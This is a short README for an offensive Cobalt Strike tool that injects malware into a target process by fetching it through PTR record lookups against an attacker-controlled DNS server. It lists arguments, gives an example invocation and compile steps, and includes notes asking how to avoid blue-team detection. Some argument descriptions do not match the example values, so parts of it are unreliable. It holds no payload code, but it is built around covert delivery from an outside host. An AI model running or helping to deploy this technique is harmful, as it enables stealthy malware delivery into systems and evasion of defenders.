# deliv-dns-ptr
Deliver malware into the target process' memory block via DNS resolution's PTR record(s).

> This operation does not need privileged rights in the system environment.

## Arguments
`<StartIpaddress>` : Specify the first 3 digits of a fake IP address seeding the operation.
`<counter_Number_of_Records>` : This is the number of PTR records to resolve.
`<FakeDNS_Server>` : Specify the IP address of the attacker controlled DNS server.
`<targetProc>` : Specify whether to do fork and run and execute payload remotely or not.

## Usage - How to not use a param? How to use different param on a different obj
* `deliv-dns-ptr <StartIpaddress> <counter_Number_of_Records> <FakeDNS_Server> <targetProc>`

## Example
* `deliv-dns-ptr 12.168.28. 36 192.168.28.3 3268`

## Questions:
* Why use this technique?
* On what specific condition will this technique be effective?
* How to prevent the blue team from detecting this kind of technique? Both on the fly and post-execution?


## Compile
- 1\. Make sure Visual Studio is installed and supports C/C++.
- 2\. Open the `x64 Native Tools Command Prompt for VS <2019/2022>` terminal.
- 3\. Run the `bofcompile.bat` script to compile the object file. 
- 4\. In Cobalt strike, use the script manager to load the .cna script to import the tool.  // how to use Aggressor script in Powershell Empire?